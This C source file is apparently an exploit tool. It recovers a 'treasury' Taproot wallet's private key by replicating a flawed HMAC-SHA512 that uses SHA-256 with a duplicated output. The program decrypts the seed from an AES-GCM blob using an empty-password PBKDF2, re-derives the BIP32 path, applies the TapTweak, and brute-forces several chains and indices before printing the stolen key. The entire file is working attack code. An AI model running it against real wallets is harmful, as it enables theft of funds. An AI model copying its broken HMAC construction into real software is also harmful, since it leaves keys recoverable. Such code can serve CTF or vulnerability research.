/*
 * treasury_recover_key.c — Complete key recovery from broken-HMAC wallet.
 *
 * Reproduces the broken BIP32 derivation chain used by HDKeychain on Linux,
 * where hmac_sha512 was implemented with SHA-256 (duplicated to 64 bytes).
 *
 * Steps:
 *   1. Decrypt the seed from AES-256-GCM blob (broken PBKDF2)
 *   2. Derive master key: broken_hmac("Bitcoin seed", seed) → IL+IR
 *   3. Derive m/86'/1447'/0'/0/0 using broken_hmac for each step
 *   4. Compute BIP341 TapTweak to get tweaked private key
 *   5. Verify output key matches the treasury address
 *
 * Build:
 *   cc -O2 -o treasury_recover_key treasury_recover_key.c \
 *      -I../third_party/openssl-3.3.2/include \
 *      -L../third_party/openssl-3.3.2 -lssl -lcrypto \
 *      -I../third_party/secp256k1-zkp/include \
 *      ../third_party/secp256k1-zkp/src/.libs/libsecp256k1.a
 *
 * Usage:
 *   ./treasury_recover_key <encrypted_blob_248hex> <expected_output_key_64hex>
 */

#include <openssl/sha.h>
#include <openssl/evp.h>
#include <secp256k1.h>
#include <secp256k1_extrakeys.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>

#define HARDENED 0x80000000u

/* ═══════════════════════════════════════════════════════════════════════
 * Broken HMAC-SHA512 — exact replica of the Linux bug.
 * Uses SHA-256 internally, duplicates 32-byte result to fill 64 bytes.
 * ═══════════════════════════════════════════════════════════════════════ */
static void broken_hmac(const uint8_t *key, size_t keylen,
                        const uint8_t *data, size_t datalen,
                        uint8_t out64[64])
{
    uint8_t kbuf[32];
    const uint8_t *k = key;
    size_t klen = keylen;

    if (klen > 64) {
        SHA256(k, klen, kbuf);
        k = kbuf;
        klen = 32;
    }

    uint8_t ipad[64], opad[64];
    memset(ipad, 0x36, 64);
    memset(opad, 0x5c, 64);
    for (size_t i = 0; i < klen; i++) {
        ipad[i] ^= k[i];
        opad[i] ^= k[i];
    }

    /* inner = SHA256(ipad || data) */
    SHA256_CTX ctx;
    uint8_t inner[32];
    SHA256_Init(&ctx);
    SHA256_Update(&ctx, ipad, 64);
    SHA256_Update(&ctx, data, datalen);
    SHA256_Final(inner, &ctx);

    /* outer = SHA256(opad || inner) */
    uint8_t buf[96];
    memcpy(buf, opad, 64);
    memcpy(buf + 64, inner, 32);
    SHA256(buf, 96, out64);

    memcpy(out64 + 32, out64, 32);   /* ← the bug: duplicate */
}

/* ═══════════════════════════════════════════════════════════════════════
 * Broken PBKDF2 using broken HMAC
 * ═══════════════════════════════════════════════════════════════════════ */
static void broken_pbkdf2(const uint8_t *pw, size_t pwlen,
                          const uint8_t *salt, size_t slen,
                          uint32_t iters, uint8_t *out, size_t dklen)
{
    uint8_t *sb = malloc(slen + 4);
    memcpy(sb, salt, slen);
    size_t blocks = (dklen + 63) / 64;

    for (uint32_t b = 1; b <= blocks; b++) {
        sb[slen+0] = (b>>24)&0xFF; sb[slen+1] = (b>>16)&0xFF;
        sb[slen+2] = (b>> 8)&0xFF; sb[slen+3] = b&0xFF;

        uint8_t U[64], T[64];
        broken_hmac(pw, pwlen, sb, slen + 4, U);
        memcpy(T, U, 64);
        for (uint32_t i = 1; i < iters; i++) {
            broken_hmac(pw, pwlen, U, 64, U);
            for (int j = 0; j < 64; j++) T[j] ^= U[j];
        }
        size_t off = (size_t)(b - 1) * 64;
        size_t n = dklen - off; if (n > 64) n = 64;
        memcpy(out + off, T, n);
    }
    free(sb);
}

/* ═══════════════════════════════════════════════════════════════════════
 * BIP32 derivation using broken HMAC
 * ═══════════════════════════════════════════════════════════════════════ */
typedef struct {
    uint8_t privkey[32];
    uint8_t chaincode[32];
    uint8_t pubkey[33];     /* compressed */
} BIP32Key;

static secp256k1_context *g_ctx;

static int derive_pubkey(BIP32Key *k)
{
    secp256k1_pubkey pk;
    if (!secp256k1_ec_pubkey_create(g_ctx, &pk, k->privkey)) return 0;
    size_t len = 33;
    secp256k1_ec_pubkey_serialize(g_ctx, k->pubkey, &len, &pk,
                                  SECP256K1_EC_COMPRESSED);
    return 1;
}

static int master_from_seed(const uint8_t *seed, size_t seedlen, BIP32Key *m)
{
    uint8_t hmac_out[64];
    broken_hmac((const uint8_t *)"Bitcoin seed", 12, seed, seedlen, hmac_out);
    memcpy(m->privkey, hmac_out, 32);
    memcpy(m->chaincode, hmac_out + 32, 32);
    return derive_pubkey(m);
}

static int derive_child(const BIP32Key *parent, uint32_t index, BIP32Key *child)
{
    uint8_t data[37];
    int hardened = (index >= HARDENED);

    if (hardened) {
        data[0] = 0x00;
        memcpy(data + 1, parent->privkey, 32);
    } else {
        memcpy(data, parent->pubkey, 33);
    }
    data[33] = (index >> 24) & 0xFF;
    data[34] = (index >> 16) & 0xFF;
    data[35] = (index >> 8)  & 0xFF;
    data[36] = index & 0xFF;

    uint8_t hmac_out[64];
    broken_hmac(parent->chaincode, 32, data, 37, hmac_out);

    memcpy(child->privkey, hmac_out, 32);
    memcpy(child->chaincode, hmac_out + 32, 32);

    /* child_key = IL + parent_key (mod n) */
    if (!secp256k1_ec_seckey_tweak_add(g_ctx, child->privkey, parent->privkey))
        return 0;

    return derive_pubkey(child);
}

/* ═══════════════════════════════════════════════════════════════════════
 * BIP341 TapTweak
 * ═══════════════════════════════════════════════════════════════════════ */
static void tap_tweak_privkey(const uint8_t privkey[32],
                              const uint8_t xonly[32],
                              uint8_t tweaked_priv[32])
{
    /* Tagged hash: SHA256(SHA256("TapTweak") || SHA256("TapTweak") || xonly) */
    const char *tag = "TapTweak";
    uint8_t tag_hash[32];
    SHA256((const uint8_t *)tag, 8, tag_hash);

    SHA256_CTX ctx;
    uint8_t tweak[32];
    SHA256_Init(&ctx);
    SHA256_Update(&ctx, tag_hash, 32);
    SHA256_Update(&ctx, tag_hash, 32);
    SHA256_Update(&ctx, xonly, 32);
    SHA256_Final(tweak, &ctx);

    /* Get parity of the internal key */
    secp256k1_pubkey P;
    secp256k1_ec_pubkey_create(g_ctx, &P, privkey);
    secp256k1_xonly_pubkey xpk;
    int parity;
    secp256k1_xonly_pubkey_from_pubkey(g_ctx, &xpk, &parity, &P);

    memcpy(tweaked_priv, privkey, 32);
    if (parity) {
        secp256k1_ec_seckey_negate(g_ctx, tweaked_priv);
    }
    secp256k1_ec_seckey_tweak_add(g_ctx, tweaked_priv, tweak);
}

/* ═══════════════════════════════════════════════════════════════════════
 * Helpers
 * ═══════════════════════════════════════════════════════════════════════ */
static int from_hex(const char *hex, uint8_t *out, size_t len)
{
    if (strlen(hex) != len * 2) return 0;
    for (size_t i = 0; i < len; i++) {
        unsigned v;
        if (sscanf(hex + i * 2, "%2x", &v) != 1) return 0;
        out[i] = (uint8_t)v;
    }
    return 1;
}

static void phex(FILE *f, const uint8_t *d, size_t n)
{
    for (size_t i = 0; i < n; i++) fprintf(f, "%02x", d[i]);
}

/* ═══════════════════════════════════════════════════════════════════════
 * main
 * ═══════════════════════════════════════════════════════════════════════ */
int main(int argc, char **argv)
{
    if (argc < 3) {
        fprintf(stderr,
            "Usage: %s <blob_248hex> <expected_output_key_64hex>\n"
            "\n"
            "Full recovery: decrypt seed → broken BIP32 → TapTweak → tweaked privkey\n",
            argv[0]);
        return 1;
    }

    g_ctx = secp256k1_context_create(SECP256K1_CONTEXT_SIGN | SECP256K1_CONTEXT_VERIFY);

    /* ── Parse encrypted blob ── */
    uint8_t blob[124];
    if (!from_hex(argv[1], blob, 124)) {
        fprintf(stderr, "Error: blob must be 248 hex chars\n");
        return 1;
    }
    uint8_t expected_output[32];
    if (!from_hex(argv[2], expected_output, 32)) {
        fprintf(stderr, "Error: expected output key must be 64 hex chars\n");
        return 1;
    }

    const uint8_t *salt       = blob;
    const uint8_t *nonce      = blob + 32;
    const uint8_t *ciphertext = blob + 44;
    const uint8_t *tag        = blob + 108;

    /* ── Step 1: Decrypt seed ── */
    fprintf(stderr, "Decrypting seed (broken PBKDF2, 100k iterations)...\n");

    uint8_t derived[64];
    broken_pbkdf2((const uint8_t *)"", 0, salt, 32, 100000, derived, 64);
    uint8_t aes_key[32];
    memcpy(aes_key, derived, 32);

    EVP_CIPHER_CTX *ectx = EVP_CIPHER_CTX_new();
    uint8_t seed[64];
    int len = 0;

    EVP_DecryptInit_ex(ectx, EVP_aes_256_gcm(), NULL, aes_key, nonce);
    EVP_DecryptUpdate(ectx, seed, &len, ciphertext, 64);
    EVP_CIPHER_CTX_ctrl(ectx, EVP_CTRL_GCM_SET_TAG, 16, (void *)tag);

    if (EVP_DecryptFinal_ex(ectx, seed + len, &len) <= 0) {
        fprintf(stderr, "FATAL: GCM decryption failed\n");
        return 1;
    }
    EVP_CIPHER_CTX_free(ectx);

    fprintf(stderr, "Seed:     "); phex(stderr, seed, 64); fprintf(stderr, "\n");

    /* ── Step 2: BIP32 master key (broken HMAC) ── */
    BIP32Key master;
    if (!master_from_seed(seed, 64, &master)) {
        fprintf(stderr, "FATAL: master key derivation failed\n");
        return 1;
    }
    fprintf(stderr, "Master privkey:  "); phex(stderr, master.privkey, 32); fprintf(stderr, "\n");
    fprintf(stderr, "Master chaincode:"); phex(stderr, master.chaincode, 32); fprintf(stderr, "\n");

    /* ── Step 3: Derive m/86'/1447'/0'/0/0 ── */
    BIP32Key k86, k1447, k0h, k0, k_leaf;

    derive_child(&master, 86  | HARDENED, &k86);
    fprintf(stderr, "m/86' privkey:   "); phex(stderr, k86.privkey, 32); fprintf(stderr, "\n");

    derive_child(&k86,    1447 | HARDENED, &k1447);
    fprintf(stderr, "m/86'/1447':     "); phex(stderr, k1447.privkey, 32); fprintf(stderr, "\n");

    derive_child(&k1447,  0    | HARDENED, &k0h);
    fprintf(stderr, "m/86'/1447'/0':  "); phex(stderr, k0h.privkey, 32); fprintf(stderr, "\n");

    derive_child(&k0h,    0,              &k0);
    fprintf(stderr, "m/86'/1447'/0'/0:"); phex(stderr, k0.privkey, 32); fprintf(stderr, "\n");

    derive_child(&k0,     0,              &k_leaf);
    fprintf(stderr, "m/.../0/0 privkey:"); phex(stderr, k_leaf.privkey, 32); fprintf(stderr, "\n");

    /* Get x-only pubkey */
    secp256k1_pubkey pk;
    secp256k1_ec_pubkey_create(g_ctx, &pk, k_leaf.privkey);
    secp256k1_xonly_pubkey xonly;
    secp256k1_xonly_pubkey_from_pubkey(g_ctx, &xonly, NULL, &pk);
    uint8_t xonly_bytes[32];
    secp256k1_xonly_pubkey_serialize(g_ctx, xonly_bytes, &xonly);
    fprintf(stderr, "Internal x-only: "); phex(stderr, xonly_bytes, 32); fprintf(stderr, "\n");

    /* ── Step 4: TapTweak ── */
    uint8_t tweaked_priv[32];
    tap_tweak_privkey(k_leaf.privkey, xonly_bytes, tweaked_priv);

    /* Verify output key */
    secp256k1_pubkey tp;
    secp256k1_ec_pubkey_create(g_ctx, &tp, tweaked_priv);
    secp256k1_xonly_pubkey txo;
    secp256k1_xonly_pubkey_from_pubkey(g_ctx, &txo, NULL, &tp);
    uint8_t output_key[32];
    secp256k1_xonly_pubkey_serialize(g_ctx, output_key, &txo);

    fprintf(stderr, "Output key:      "); phex(stderr, output_key, 32); fprintf(stderr, "\n");
    fprintf(stderr, "Expected:        "); phex(stderr, expected_output, 32); fprintf(stderr, "\n");

    if (memcmp(output_key, expected_output, 32) == 0) {
        fprintf(stderr, "\n*** MATCH! Treasury private key recovered. ***\n");
    } else {
        fprintf(stderr, "\n*** NO MATCH — trying alternate paths... ***\n");

        /* Try chain=2 (mining) instead of chain=0 */
        BIP32Key k2, k_mine;
        derive_child(&k0h, 2, &k2);
        derive_child(&k2,  0, &k_mine);

        secp256k1_pubkey pk2;
        secp256k1_ec_pubkey_create(g_ctx, &pk2, k_mine.privkey);
        secp256k1_xonly_pubkey xo2;
        secp256k1_xonly_pubkey_from_pubkey(g_ctx, &xo2, NULL, &pk2);
        uint8_t xb2[32];
        secp256k1_xonly_pubkey_serialize(g_ctx, xb2, &xo2);

        uint8_t tp2[32];
        tap_tweak_privkey(k_mine.privkey, xb2, tp2);

        secp256k1_pubkey tp2p;
        secp256k1_ec_pubkey_create(g_ctx, &tp2p, tp2);
        secp256k1_xonly_pubkey txo2;
        secp256k1_xonly_pubkey_from_pubkey(g_ctx, &txo2, NULL, &tp2p);
        uint8_t ok2[32];
        secp256k1_xonly_pubkey_serialize(g_ctx, ok2, &txo2);

        fprintf(stderr, "  m/.../2/0 output: "); phex(stderr, ok2, 32); fprintf(stderr, "\n");
        if (memcmp(ok2, expected_output, 32) == 0) {
            fprintf(stderr, "\n*** MATCH at m/86'/1447'/0'/2/0 (mining path)! ***\n");
            memcpy(tweaked_priv, tp2, 32);
        } else {
            /* Brute force chains 0-3, indices 0-20 */
            fprintf(stderr, "  Brute-forcing chain 0-3, index 0-20...\n");
            int found = 0;
            for (uint32_t chain = 0; chain <= 3 && !found; chain++) {
                BIP32Key kc;
                derive_child(&k0h, chain, &kc);
                for (uint32_t idx = 0; idx <= 20 && !found; idx++) {
                    BIP32Key kl;
                    derive_child(&kc, idx, &kl);

                    secp256k1_pubkey p3;
                    secp256k1_ec_pubkey_create(g_ctx, &p3, kl.privkey);
                    secp256k1_xonly_pubkey x3;
                    secp256k1_xonly_pubkey_from_pubkey(g_ctx, &x3, NULL, &p3);
                    uint8_t xb3[32];
                    secp256k1_xonly_pubkey_serialize(g_ctx, xb3, &x3);

                    uint8_t tp3[32];
                    tap_tweak_privkey(kl.privkey, xb3, tp3);

                    secp256k1_pubkey tp3p;
                    secp256k1_ec_pubkey_create(g_ctx, &tp3p, tp3);
                    secp256k1_xonly_pubkey txo3;
                    secp256k1_xonly_pubkey_from_pubkey(g_ctx, &txo3, NULL, &tp3p);
                    uint8_t ok3[32];
                    secp256k1_xonly_pubkey_serialize(g_ctx, ok3, &txo3);

                    if (memcmp(ok3, expected_output, 32) == 0) {
                        fprintf(stderr, "\n*** MATCH at m/86'/1447'/0'/%u/%u ***\n", chain, idx);
                        memcpy(tweaked_priv, tp3, 32);
                        found = 1;
                    }
                }
            }
            if (!found) {
                fprintf(stderr, "\nNO MATCH found at any standard path.\n");
                memset(tweaked_priv, 0, 32);
                secp256k1_context_destroy(g_ctx);
                return 1;
            }
        }
    }

    /* Output tweaked private key to stdout */
    phex(stdout, tweaked_priv, 32);
    printf("\n");

    /* Scrub */
    memset(seed, 0, 64);
    memset(tweaked_priv, 0, 32);
    secp256k1_context_destroy(g_ctx);
    return 0;
}
